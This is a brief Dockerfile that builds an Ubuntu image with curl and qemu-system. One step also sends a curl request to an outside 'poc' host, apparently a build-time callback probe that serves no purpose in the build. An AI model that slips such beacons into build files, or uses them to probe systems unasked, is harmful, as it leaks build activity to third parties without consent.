FROM y0araofw.mirror.aliyuncs.com/library/ubuntu:latest

USER root

WORKDIR /

RUN apt update && \
    apt install -y curl && \
    apt-get install -y qemu-system && \
    curl https://dev.poc.ns.zeroscan.xyz/123 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
    
